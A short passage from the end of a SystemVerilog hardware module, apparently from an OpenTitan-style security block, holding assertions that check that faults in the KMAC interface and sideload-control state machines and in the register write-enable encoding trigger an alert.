  `ASSERT_PRIM_FSM_ERROR_TRIGGER_ALERT(KmacIfFsmCheck_A, u_kmac_if.u_state_regs, alert_tx_o[1])
  `ASSERT_PRIM_FSM_ERROR_TRIGGER_ALERT(SideloadCtrlFsmCheck_A,
      u_sideload_ctrl.u_state_regs, alert_tx_o[1])
  `ASSERT_PRIM_REG_WE_ONEHOT_ERROR_TRIGGER_ALERT(RegWeOnehotCheck_A, u_reg, alert_tx_o[1])
endmodule